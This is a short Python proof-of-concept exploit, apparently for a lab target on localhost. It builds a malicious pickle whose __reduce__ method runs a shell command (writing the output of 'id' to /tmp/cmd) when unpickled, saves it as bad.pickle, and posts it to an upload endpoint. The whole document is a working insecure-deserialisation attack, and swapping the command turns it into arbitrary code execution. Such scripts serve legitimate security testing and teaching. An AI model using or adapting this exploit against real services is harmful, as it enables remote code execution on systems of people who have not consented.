import pickle
import os
import requests

class MyObject(object):
    def __reduce__(self):
        return os.system, ('id > /tmp/cmd',)

o = MyObject()
p = pickle.dump(o, open('bad.pickle', 'wb'))


url = 'http://localhost:5000/upload'
files = {'file': open("bad.pickle", "rb").read()}
response = requests.post(url, files=files)
print(response.text)